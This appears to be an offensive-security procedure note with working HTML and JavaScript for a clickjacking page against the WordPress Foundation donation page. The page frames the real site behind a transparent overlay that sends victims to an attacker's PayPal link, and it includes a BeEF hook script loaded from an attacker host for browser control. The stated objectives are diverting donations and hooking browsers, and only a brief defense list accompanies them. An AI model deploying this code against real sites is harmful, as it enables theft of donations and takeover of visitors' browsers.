---
tags:
  - clickjacking
  - web
  - paypal
  - beef
type: procedure
tools:
  - '[[tools/BeEF]]'
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:28:12.958Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 85f958ba-eb2f-4d66-83d6-8aab4e85b2ea
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# Create-Clickjacking-POC-to-Redirect-Donations

## Summary

This procedure creates a proof-of-concept (POC) HTML page that exploits clickjacking by overlaying a transparent iframe of the WordPress donation page, tricking users into clicking a 'give once' button that redirects to an attacker's PayPal donation link, with optional BeEF integration for browser control.

## Description

The POC uses CSS positioning to make the iframe invisible and overlays clickable elements aligned with the target's donation button. When a victim clicks, it submits a form or redirects to a malicious PayPal URL (e.g., with a specific payment-request ID). This can steal donations or hook the browser via BeEF for further actions like information gathering. The target is https://wordpressfoundation.org/donate/, vulnerable due to no frame protections.

## Requirements

1. Text editor for HTML/CSS/JS
2. Hosting for the POC page (local server or external host)
3. Attacker's PayPal account with a donation link
4. Optional: BeEF framework setup for browser hooking

## Defense

Defensive measures and detection strategies:

- Enforce strict CSP frame-ancestors and X-Frame-Options headers
- Educate users on phishing via donation overlays
- Monitor traffic for anomalous redirects to payment processors like PayPal
- Use client-side frame-busting JavaScript as fallback

## Objectives

1. Trick users into unintended clicks on the embedded page
2. Redirect donations to attacker's PayPal account
3. Optionally hook browser with BeEF for additional control and data exfiltration

## Instructions

### Step 1: Build POC HTML Structure

**Context**: Create the base HTML with an iframe and overlay div to position a fake button over the target's 'give once' option.

Create `donation.html` with:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Support Open Source</title>
    <style>
        iframe { position: absolute; top: 0; left: 0; opacity: 0.5; z-index: 1; }
        .overlay { position: absolute; top: 500px; left: 800px; z-index: 2; width: 200px; height: 50px; background: transparent; }
    </style>
</head>
<body>
    <iframe src="https://wordpressfoundation.org/donate/" width="1920" height="1200"></iframe>
    <div class="overlay" onclick="redirectToPayPal()"></div>
    <script>
        function redirectToPayPal() {
            window.location.href = 'https://www.paypal.com/cgi-bin/webscr?cmd=_s-xclick&hosted_button_id=ATTACKER_ID';
        }
    </script>
</body>
</html>
```

> Adjust top/left values to align with the 'give once' button (inspect target page for coordinates). The overlay captures clicks invisibly.

### Step 2: Test and Deploy POC

**Context**: Host the POC and simulate victim interaction to verify redirection, optionally injecting BeEF hook.

Serve the file locally (e.g., via browser file open) or on a server, then click the overlaid area.

For BeEF integration, add a script tag in the POC:

```html
<script src="http://beef-ip:3000/hook.js"></script>
```

> Expected: Click redirects to PayPal with attacker's ID. BeEF console shows hooked browser if integrated. Note: A secondary low-impact vuln on https://central.wordcamp.org/ follows similar steps but is mitigated for logged-in users.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Drive-by Compromise]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/BeEF]]

## Tags

- [[clickjacking]]
- [[web]]
- [[paypal]]
- [[tools/BeEF]]
